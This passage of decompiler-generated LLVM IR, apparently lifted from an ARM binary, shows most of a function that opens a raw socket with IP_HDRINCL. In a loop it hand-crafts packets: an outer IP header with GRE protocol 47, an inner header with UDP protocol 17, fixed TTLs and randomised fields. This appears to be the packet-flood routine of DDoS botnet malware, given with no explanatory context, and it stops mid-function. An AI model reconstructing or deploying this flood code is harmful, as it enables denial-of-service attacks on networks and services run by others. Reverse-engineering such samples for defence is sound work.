  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 19, 18, 20, 21, 22, 23, 25, 24, 29, 26, 27, 28, 32, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 19, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_aa70, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_a96c, { 1, 0 }
  uselistorder label %dec_label_pc_a890, { 1, 0 }
  uselistorder label %dec_label_pc_a82c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a79c.preheader, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %.thread22, { 2, 1, 0 }
}

define i32 @function_aaac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_aaac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_aaac = load i32, i32* @r4, align 4
  %v6_aaac = load i32, i32* @r5, align 4
  %v9_aaac = load i32, i32* @r6, align 4
  %v12_aaac = load i32, i32* @r7, align 4
  %v15_aaac = load i32, i32* @r8, align 4
  %v1_aab0 = urem i32 %arg1, 256
  store i32 %v1_aab0, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_aab0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_aac8 = urem i32 %arg3, 256
  store i32 %v1_aac8, i32* @r4, align 4
  %v2_aacc = call i32* @calloc(i32 %v1_aab0, i32 4)
  %v4_aacc = ptrtoint i32* %v2_aacc to i32
  %v0_aad0 = load i32, i32* @r5, align 4
  store i32 %v0_aad0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_aae0 = load i32, i32* @r4, align 4
  store i32 %v0_aae0, i32* %r0.global-to-local, align 4
  %v5_aae4 = inttoptr i32 %v0_aad0 to i32*
  %v6_aae4 = call i32 @function_92dc(i32 %v0_aae0, i32* %v5_aae4, i32 2, i32 0)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_aafc = load i32, i32* @r5, align 4
  store i32 %v0_aafc, i32* %r1.global-to-local, align 4
  %v0_ab00 = load i32, i32* @r4, align 4
  store i32 %v0_ab00, i32* %r0.global-to-local, align 4
  %v5_ab04 = trunc i32 %v6_aae4 to i8
  %v6_ab08 = inttoptr i32 %v0_aafc to i32*
  %v7_ab08 = call i32 @function_92dc(i32 %v0_ab00, i32* %v6_ab08, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_ab0c = load i32, i32* @r5, align 4
  store i32 %v0_ab0c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ab08, i32* @r7, align 4
  %v0_ab1c = load i32, i32* @r4, align 4
  store i32 %v0_ab1c, i32* %r0.global-to-local, align 4
  %v4_ab20 = inttoptr i32 %v0_ab0c to i32*
  %v5_ab20 = call i32 @function_92dc(i32 %v0_ab1c, i32* %v4_ab20, i32 4, i32 64)
  %v0_ab2c = load i32, i32* @r5, align 4
  store i32 %v0_ab2c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ab38 = load i32, i32* @r4, align 4
  store i32 %v0_ab38, i32* %r0.global-to-local, align 4
  %v5_ab3c = trunc i32 %v5_ab20 to i8
  %v6_ab40 = inttoptr i32 %v0_ab2c to i32*
  %v7_ab40 = call i32 @function_92dc(i32 %v0_ab38, i32* %v6_ab40, i32 5, i32 1)
  %v1_ab4c = urem i32 %v7_ab40, 256
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ab58 = load i32, i32* @r5, align 4
  store i32 %v0_ab58, i32* %r1.global-to-local, align 4
  %v0_ab5c = load i32, i32* @r4, align 4
  store i32 %v0_ab5c, i32* %r0.global-to-local, align 4
  %v5_ab64 = inttoptr i32 %v0_ab58 to i32*
  %v6_ab64 = call i32 @function_92dc(i32 %v0_ab5c, i32* %v5_ab64, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_ab6c = load i32, i32* @r5, align 4
  store i32 %v0_ab6c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_ab64, i32* @sl, align 4
  %v0_ab7c = load i32, i32* @r4, align 4
  store i32 %v0_ab7c, i32* %r0.global-to-local, align 4
  %v4_ab80 = inttoptr i32 %v0_ab6c to i32*
  %v5_ab80 = call i32 @function_92dc(i32 %v0_ab7c, i32* %v4_ab80, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_ab84 = load i32, i32* @r5, align 4
  store i32 %v0_ab84, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_ab80, i32* @r8, align 4
  %v0_ab94 = load i32, i32* @r4, align 4
  store i32 %v0_ab94, i32* %r0.global-to-local, align 4
  %v4_ab98 = inttoptr i32 %v0_ab84 to i32*
  %v5_ab98 = call i32 @function_92dc(i32 %v0_ab94, i32* %v4_ab98, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  %v0_abac = load i32, i32* @r4, align 4
  store i32 %v0_abac, i32* %r0.global-to-local, align 4
  %v4_abb0 = inttoptr i32 %v0_aba8 to i32*
  %v5_abb0 = call i32 @function_92dc(i32 %v0_abac, i32* %v4_abb0, i32 1, i32 1)
  %v1_abb8 = urem i32 %v5_abb0, 256
  %v0_abbc = load i32, i32* @r5, align 4
  store i32 %v0_abbc, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abc8 = load i32, i32* @r4, align 4
  store i32 %v0_abc8, i32* %r0.global-to-local, align 4
  %v5_abd0 = inttoptr i32 %v0_abbc to i32*
  %v6_abd0 = call i32 @function_92dc(i32 %v0_abc8, i32* %v5_abd0, i32 19, i32 0)
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v2_abdc = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_abdc, i32* %r3.global-to-local, align 4
  store i32 %v6_abd0, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i32, i32* @r4, align 4
  store i32 %v0_abe8, i32* %r0.global-to-local, align 4
  %v4_abec = inttoptr i32 %v0_abd8 to i32*
  %v5_abec = call i32 @function_92dc(i32 %v0_abe8, i32* %v4_abec, i32 25, i32 %v2_abdc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ac00 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ac00, i32* %r0.global-to-local, align 4
  %v2_ac04 = icmp eq i32 %v3_ac00, -1
  store i1 %v2_ac04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ac04, label %dec_label_pc_b084, label %dec_label_pc_ac10

dec_label_pc_ac10:                                ; preds = %dec_label_pc_aaac
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ac18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ac18, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_ac2c = call i32 @setsockopt(i32 %v3_ac00, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_ac2c, i32* %r0.global-to-local, align 4
  %v2_ac30 = icmp eq i32 %v7_ac2c, -1
  store i1 %v2_ac30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ac30, label %dec_label_pc_b07c, label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac10
  %v0_ac38 = load i32, i32* @sl, align 4
  %v0_ac44 = load i32, i32* @r8, align 4
  %v3_ac44 = mul i32 %v0_ac44, 65536
  store i32 %v3_ac44, i32* %r8.global-to-local, align 4
  %v0_ac48 = load i32, i32* @r7, align 4
  %v3_ac48 = mul i32 %v0_ac48, 65536
  store i32 %v3_ac48, i32* %r7.global-to-local, align 4
  %v0_ac4c = load i32, i32* @r6, align 4
  %v1_ac4c = urem i32 %v0_ac4c, 256
  store i32 %v1_ac4c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ac54 = urem i32 %v0_ac38, 65536
  store i32 %v3_ac54, i32* %r2.global-to-local, align 4
  %v3_ac58 = urem i32 %v0_ac44, 65536
  store i32 %v3_ac58, i32* %r3.global-to-local, align 4
  %v0_ac5c = load i32, i32* @fp, align 4
  %v2_ac5c = icmp eq i32 %v0_ac5c, 0
  store i1 %v2_ac5c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ac6c = urem i32 %v0_ac48, 65536
  store i32 %v3_ac6c, i32* @sl, align 4
  %tmp85 = icmp slt i32 %v0_ac5c, 1
  br i1 %tmp85, label %dec_label_pc_b1a8, label %dec_label_pc_ac7c

dec_label_pc_ac7c:                                ; preds = %dec_label_pc_ac38
  %v3_ac80 = mul i32 %v5_ab98, 65536
  %v1_ac84 = add i32 %v3_ac80, 3407872
  %v3_ac8c = udiv i32 %v1_ac84, 256
  %v0_ac48.not = or i32 %v0_ac48, -65536
  %v1_ac9c = xor i32 %v0_ac48.not, 65535
  %v1_aca0 = urem i32 %v0_ac44, 256
  %tmp86 = mul nsw i32 %v1_ac9c, 256
  %v1_acb8 = and i32 %v3_ac8c, 65280
  %v1_acbc = add i32 %v3_ac80, 524288
  %v4_acc0 = udiv i32 %v1_ac84, 16777216
  %v5_acc0 = or i32 %v1_acb8, %v4_acc0
  store i32 %v5_acc0, i32* %r0.global-to-local, align 4
  %v1_acc4 = add i32 %v3_ac80, 1835008
  %v1_accc = and i32 %tmp86, 65280
  store i32 %v1_accc, i32* %lr.global-to-local, align 4
  %tmp87 = udiv i32 %v1_ac9c, 256
  %tmp88 = udiv i32 %v0_ac48, 256
  %v5_ace0 = trunc i32 %tmp87 to i8
  %tmp89 = udiv i32 %v0_ac38, 256
  %sext30 = mul i32 %tmp88, 16777216
  %v4_ad00 = sdiv i32 %sext30, 16777216
  %v3_ad0c = mul nuw nsw i32 %v1_aca0, 256
  store i32 %v3_ad0c, i32* %r5.global-to-local, align 4
  %v3_ad10 = udiv i32 %v1_acbc, 256
  %tmp90 = udiv i32 %v0_ac44, 256
  %v4_ad18 = urem i32 %tmp90, 256
  %v5_ad18 = or i32 %v4_ad18, %v3_ad0c
  store i32 %v5_ad18, i32* %r7.global-to-local, align 4
  %v3_ad1c = ashr i32 %sext30, 31
  %v3_ad28 = sdiv i32 %v1_acc4, 16777216
  %v1_ad2c = and i32 %v3_ad10, 65280
  store i32 %v1_ad2c, i32* %r6.global-to-local, align 4
  %sext31 = mul i32 %tmp89, 16777216
  %v4_ad34 = sdiv i32 %sext31, 16777216
  %v3_ad38 = ashr i32 %v1_acc4, 31
  %v3_ad3c = udiv i32 %v1_ac9c, 65536
  %v4_ad40 = udiv i32 %v1_acbc, 16777216
  %v5_ad40 = or i32 %v1_ad2c, %v4_ad40
  store i32 %v5_ad40, i32* %r8.global-to-local, align 4
  %v3_ad4c = ashr i32 %sext31, 31
  store i32 %v3_ad4c, i32* %r1.global-to-local, align 4
  store i32 %v1_aca0, i32* %r2.global-to-local, align 4
  %v3_ad5442 = udiv i32 %v1_ad2c, 256
  store i32 %v3_ad5442, i32* %r3.global-to-local, align 4
  %v5_ad5c = trunc i32 %v3_ad4c to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_adb8 = sext i8 %v5_ab3c to i32
  %sext = mul i32 %v1_ac84, 256
  %v4_adc0 = sdiv i32 %sext, 16777216
  %sext17 = mul nuw i32 %v4_acc0, 16777216
  %v4_add0 = sdiv i32 %sext17, 16777216
  %v2_aea4 = icmp eq i32 %v1_ac4c, 0
  %sext21 = mul i32 %v1_acbc, 256
  %v4_aec4 = sdiv i32 %sext21, 16777216
  %sext22 = mul i32 %v0_ac44, 16777216
  %v7_aedc = sdiv i32 %sext22, 16777216
  %v1_adcc = trunc i32 %v4_adc0 to i8
  br label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %bb97, %dec_label_pc_ac7c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ad78 = call i32* @calloc(i32 1510, i32 4)
  %v4_ad78 = ptrtoint i32* %v2_ad78 to i32
  store i32 %v4_ad78, i32* %r0.global-to-local, align 4
  store i32 %v4_aacc, i32* %r1.global-to-local, align 4
  %v3_ad80 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ad80, i32* %r3.global-to-local, align 4
  %v2_ad84 = load i32, i32* %r4.global-to-local, align 4
  %v5_ad84 = mul i32 %v2_ad84, 4
  %v6_ad84 = add i32 %v5_ad84, %v4_aacc
  %v7_ad84 = inttoptr i32 %v6_ad84 to i32*
  store i32 %v4_ad78, i32* %v7_ad84, align 4
  %v0_ad88 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad88 = load i32, i32* %r3.global-to-local, align 4
  %v4_ad88 = mul i32 %v1_ad88, 4
  %v5_ad88 = add i32 %v4_ad88, %v0_ad88
  %v6_ad88 = inttoptr i32 %v5_ad88 to i32*
  %v7_ad88 = load i32, i32* %v6_ad88, align 4
  store i32 %v7_ad88, i32* %r4.global-to-local, align 4
  %v1_ad8c = inttoptr i32 %v7_ad88 to i8*
  %v2_ad8c = load i8, i8* %v1_ad8c, align 1
  %tmp = urem i8 %v2_ad8c, 16
  %v1_ad90 = zext i8 %tmp to i32
  %v1_ad94 = or i32 %v1_ad90, 64
  store i32 %v1_ad94, i32* %r2.global-to-local, align 4
  %v1_ad98 = trunc i32 %v1_ad94 to i8
  store i8 %v1_ad98, i8* %v1_ad8c, align 1
  %v0_ad9c = load i32, i32* %r4.global-to-local, align 4
  %v1_ad9c = inttoptr i32 %v0_ad9c to i8*
  %v2_ad9c = load i8, i8* %v1_ad9c, align 1
  %v1_ada0 = and i8 %v2_ad9c, -16
  %v1_ada4 = or i8 %v1_ada0, 5
  store i32 %v1_ab4c, i32* %r2.global-to-local, align 4
  store i8 %v1_ada4, i8* %v1_ad9c, align 1
  %v2_adb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_adb4 = add i32 %v2_adb4, 1
  %v4_adb4 = inttoptr i32 %v3_adb4 to i8*
  store i8 %v5_ab04, i8* %v4_adb4, align 1
  store i32 %v4_adb8, i32* %r1.global-to-local, align 4
  %v2_adbc = load i32, i32* %r4.global-to-local, align 4
  %v3_adbc = add i32 %v2_adbc, 8
  %v4_adbc = inttoptr i32 %v3_adbc to i8*
  store i8 %v5_ab3c, i8* %v4_adbc, align 1
  store i32 %v4_adc0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_adc8 = load i32, i32* %r2.global-to-local, align 4
  %v9_adc8 = icmp eq i32 %v0_adc8, 0
  store i1 %v9_adc8, i1* %cpsr_z.global-to-local, align 1
  %v2_adcc = load i32, i32* %r4.global-to-local, align 4
  %v3_adcc = add i32 %v2_adcc, 3
  %v4_adcc = inttoptr i32 %v3_adcc to i8*
  store i8 %v1_adcc, i8* %v4_adcc, align 1
  store i32 %v4_add0, i32* %r2.global-to-local, align 4
  %v0_add4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_add4, label %.thread24, label %.thread

.thread:                                          ; preds = %dec_label_pc_ad6c
  %v1_add4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_add4, i32* %r3.global-to-local, align 4
  %v2_add8 = trunc i32 %v1_add4 to i8
  %v3_add8 = load i32, i32* %r4.global-to-local, align 4
  %v4_add8 = add i32 %v3_add8, 7
  %v5_add8 = inttoptr i32 %v4_add8 to i8*
  store i8 %v2_add8, i8* %v5_add8, align 1
  %v0_addc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_addc.pr.pr, label %.thread24, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ade0 = load i32, i32* %r4.global-to-local, align 4
  %v4_ade0 = add i32 %v3_ade0, 6
  %v5_ade0 = inttoptr i32 %v4_ade0 to i8*
  store i8 64, i8* %v5_ade0, align 1
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ad6c, %.thread, %bb
  %v0_ade4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ade4 = trunc i32 %v0_ade4 to i8
  %v2_ade4 = load i32, i32* %r4.global-to-local, align 4
  %v3_ade4 = add i32 %v2_ade4, 2
  %v4_ade4 = inttoptr i32 %v3_ade4 to i8*
  store i8 %v1_ade4, i8* %v4_ade4, align 1
  store i32 %v3_ad1c, i32* %r2.global-to-local, align 4
  store i32 %v4_ad00, i32* %r1.global-to-local, align 4
  %v2_adf4 = load i32, i32* %r4.global-to-local, align 4
  %v3_adf4 = add i32 %v2_adf4, 9
  %v4_adf4 = inttoptr i32 %v3_adf4 to i8*
  store i8 47, i8* %v4_adf4, align 1
  %v0_adf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_adf8 = trunc i32 %v0_adf8 to i8
  %v2_adf8 = load i32, i32* %r4.global-to-local, align 4
  %v3_adf8 = add i32 %v2_adf8, 5
  %v4_adf8 = inttoptr i32 %v3_adf8 to i8*
  store i8 %v1_adf8, i8* %v4_adf8, align 1
  %v3_adfc = load i32, i32* %stack_var_-40, align 4
  %v5_ae04 = mul i32 %v3_adfc, 24
  store i32 %v5_ae04, i32* %r3.global-to-local, align 4
  store i32 %v5_abec, i32* %r2.global-to-local, align 4
  %v1_ae0c = load i32, i32* %r4.global-to-local, align 4
  %v2_ae0c = add i32 %v1_ae0c, 12
  %v3_ae0c = inttoptr i32 %v2_ae0c to i32*
  store i32 %v5_abec, i32* %v3_ae0c, align 4
  %v0_ae10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae10 = load i32, i32* @sb, align 4
  %v2_ae10 = add i32 %v1_ae10, %v0_ae10
  store i32 %v2_ae10, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae14 = trunc i32 %v0_ae14 to i8
  %v2_ae14 = load i32, i32* %r4.global-to-local, align 4
  %v3_ae14 = add i32 %v2_ae14, 4
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  %v0_ae18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae18 = add i32 %v0_ae18, 16
  %v2_ae18 = inttoptr i32 %v1_ae18 to i32*
  %v3_ae18 = load i32, i32* %v2_ae18, align 4
  store i32 %v3_ae18, i32* %r2.global-to-local, align 4
  %v0_ae1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ae1c = add i32 %v0_ae1c, 20
  store i32 %v1_ae1c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_ae24 = load i32, i32* %r0.global-to-local, align 4
  %v1_ae24 = trunc i32 %v0_ae24 to i8
  %v3_ae24 = add i32 %v0_ae1c, 23
  %v4_ae24 = inttoptr i32 %v3_ae24 to i8*
  store i8 %v1_ae24, i8* %v4_ae24, align 1
  %v0_ae28 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae28 = trunc i32 %v0_ae28 to i8
  %v2_ae28 = load i32, i32* %r1.global-to-local, align 4
  %v3_ae28 = add i32 %v2_ae28, 2
  %v4_ae28 = inttoptr i32 %v3_ae28 to i8*
  store i8 %v1_ae28, i8* %v4_ae28, align 1
  %v0_ae2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ae2c = add i32 %v0_ae2c, 24
  %v2_ae2c = inttoptr i32 %v1_ae2c to i8*
  %v3_ae2c = load i8, i8* %v2_ae2c, align 1
  %tmp103 = urem i8 %v3_ae2c, 16
  %v1_ae30 = zext i8 %tmp103 to i32
  %v1_ae34 = or i32 %v1_ae30, 64
  store i32 %v1_ae34, i32* %r3.global-to-local, align 4
  %v1_ae38 = trunc i32 %v1_ae34 to i8
  store i8 %v1_ae38, i8* %v2_ae2c, align 1
  %v0_ae3c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae3c = load i32, i32* %r4.global-to-local, align 4
  %v2_ae3c = add i32 %v1_ae3c, 16
  %v3_ae3c = inttoptr i32 %v2_ae3c to i32*
  store i32 %v0_ae3c, i32* %v3_ae3c, align 4
  %v0_ae40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ae40 = add i32 %v0_ae40, 24
  %v2_ae40 = inttoptr i32 %v1_ae40 to i8*
  %v3_ae40 = load i8, i8* %v2_ae40, align 1
  %v1_ae44 = and i8 %v3_ae40, -16
  %v1_ae48 = or i8 %v1_ae44, 5
  store i8 %v1_ae48, i8* %v2_ae40, align 1
  %v0_ae54 = load i32, i32* %r4.global-to-local, align 4
  %v1_ae54 = add i32 %v0_ae54, 24
  store i32 %v1_ae54, i32* %r5.global-to-local, align 4
  %v3_ae58 = add i32 %v0_ae54, 25
  %v4_ae58 = inttoptr i32 %v3_ae58 to i8*
  store i8 %v5_ab04, i8* %v4_ae58, align 1
  store i32 %v3_ad28, i32* %r1.global-to-local, align 4
  store i32 %tmp87, i32* %r3.global-to-local, align 4
  store i32 %v3_ad38, i32* %r2.global-to-local, align 4
  %v2_ae68 = load i32, i32* %r5.global-to-local, align 4
  %v3_ae68 = add i32 %v2_ae68, 4
  %v4_ae68 = inttoptr i32 %v3_ae68 to i8*
  store i8 %v5_ace0, i8* %v4_ae68, align 1
  %v0_ae6c = load i32, i32* %r1.global-to-local, align 4
  %v1_ae6c = trunc i32 %v0_ae6c to i8
  %v2_ae6c = load i32, i32* %r5.global-to-local, align 4
  %v3_ae6c = add i32 %v2_ae6c, 2
  %v4_ae6c = inttoptr i32 %v3_ae6c to i8*
  store i8 %v1_ae6c, i8* %v4_ae6c, align 1
  %v0_ae70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ae70, label %bb92, label %bb91

bb91:                                             ; preds = %.thread24
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread24, %bb91
  store i32 %v3_ad3c, i32* %r1.global-to-local, align 4
  %v0_ae78 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae78 = trunc i32 %v0_ae78 to i8
  %v2_ae78 = load i32, i32* %r5.global-to-local, align 4
  %v3_ae78 = add i32 %v2_ae78, 3
  %v4_ae78 = inttoptr i32 %v3_ae78 to i8*
  store i8 %v1_ae78, i8* %v4_ae78, align 1
  store i32 %v4_adb8, i32* %r2.global-to-local, align 4
  %v0_ae80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ae80, label %bb94, label %bb93

bb93:                                             ; preds = %bb92
  %v1_ae80 = load i32, i32* %r3.global-to-local, align 4
  %v2_ae80 = trunc i32 %v1_ae80 to i8
  %v3_ae80 = load i32, i32* %r5.global-to-local, align 4
  %v4_ae80 = add i32 %v3_ae80, 6
  %v5_ae80 = inttoptr i32 %v4_ae80 to i8*
  store i8 %v2_ae80, i8* %v5_ae80, align 1
  br label %bb94

bb94:                                             ; preds = %bb92, %bb93
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_ae88 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae88 = trunc i32 %v0_ae88 to i8
  %v2_ae88 = load i32, i32* %r5.global-to-local, align 4
  %v3_ae88 = add i32 %v2_ae88, 5
  %v4_ae88 = inttoptr i32 %v3_ae88 to i8*
  store i8 %v1_ae88, i8* %v4_ae88, align 1
  %v0_ae8c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae8c = trunc i32 %v0_ae8c to i8
  %v2_ae8c = load i32, i32* %r5.global-to-local, align 4
  %v3_ae8c = add i32 %v2_ae8c, 8
  %v4_ae8c = inttoptr i32 %v3_ae8c to i8*
  store i8 %v1_ae8c, i8* %v4_ae8c, align 1
  %v0_ae90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ae90, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_ae90 = load i32, i32* %r0.global-to-local, align 4
  %v2_ae90 = trunc i32 %v1_ae90 to i8
  %v3_ae90 = load i32, i32* %r5.global-to-local, align 4
  %v4_ae90 = add i32 %v3_ae90, 7
  %v5_ae90 = inttoptr i32 %v4_ae90 to i8*
  store i8 %v2_ae90, i8* %v5_ae90, align 1
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_ae94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae94 = trunc i32 %v0_ae94 to i8
  %v2_ae94 = load i32, i32* %r5.global-to-local, align 4
  %v3_ae94 = add i32 %v2_ae94, 9
  %v4_ae94 = inttoptr i32 %v3_ae94 to i8*
  store i8 %v1_ae94, i8* %v4_ae94, align 1
  %v0_ae98 = call i32 @function_f67c()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v1_ac4c, i32* %r1.global-to-local, align 4
  store i1 %v2_aea4, i1* %cpsr_z.global-to-local, align 1
  %v1_aea8 = sub i32 1023, %v0_ae98
  store i32 %v1_aea8, i32* %r3.global-to-local, align 4
  br i1 %v2_aea4, label %.thread25, label %.thread26

.thread25:                                        ; preds = %bb96
  %v2_aeb0 = load i32, i32* %r5.global-to-local, align 4
  %v3_aeb0 = add i32 %v2_aeb0, 16
  %v4_aeb0 = inttoptr i32 %v3_aeb0 to i32*
  store i32 %v1_aea8, i32* %v4_aeb0, align 4
  br label %bb97

.thread26:                                        ; preds = %bb96
  %v1_aeac = load i32, i32* %r4.global-to-local, align 4
  %v2_aeac = add i32 %v1_aeac, 16
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  %v4_aeac = load i32, i32* %v3_aeac, align 4
  store i32 %v4_aeac, i32* %r3.global-to-local, align 4
  %v2_aeb4 = load i32, i32* %r5.global-to-local, align 4
  %v3_aeb4 = add i32 %v2_aeb4, 16
  %v4_aeb4 = inttoptr i32 %v3_aeb4 to i32*
  store i32 %v4_aeac, i32* %v4_aeb4, align 4
  br label %bb97

bb97:                                             ; preds = %.thread25, %.thread26
  store i32 %v4_ad34, i32* %r3.global-to-local, align 4
  %v0_aebc = load i32, i32* %r4.global-to-local, align 4
  %v1_aebc = add i32 %v0_aebc, 44
  store i32 %v1_aebc, i32* %r6.global-to-local, align 4
  %v1_aec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_aec0 = add i32 %v1_aec0, 12
  %v3_aec0 = inttoptr i32 %v2_aec0 to i32*
  store i32 %v0_ae98, i32* %v3_aec0, align 4
  store i32 %v4_aec4, i32* %r2.global-to-local, align 4
  %v0_aec8 = load i32, i32* %r3.global-to-local, align 4
  %v1_aec8 = trunc i32 %v0_aec8 to i8
  %v2_aec8 = load i32, i32* %r6.global-to-local, align 4
  %v3_aec8 = inttoptr i32 %v2_aec8 to i8*
  store i8 %v1_aec8, i8* %v3_aec8, align 1
  %v3_aecc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_aecc, i32* %r3.global-to-local, align 4
  %v0_aed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed0 = trunc i32 %v0_aed0 to i8
  %v2_aed0 = load i32, i32* %r6.global-to-local, align 4
  %v3_aed0 = add i32 %v2_aed0, 5
  %v4_aed0 = inttoptr i32 %v3_aed0 to i8*
  store i8 %v1_aed0, i8* %v4_aed0, align 1
  %v0_aed4 = load i32, i32* %r3.global-to-local, align 4
  %v1_aed4 = add i32 %v0_aed4, 1
  store i32 %v1_aed4, i32* %r4.global-to-local, align 4
  store i32 %v3_ad4c, i32* %r1.global-to-local, align 4
  store i32 %v7_aedc, i32* %r2.global-to-local, align 4
  %v1_aee0 = load i32, i32* @fp, align 4
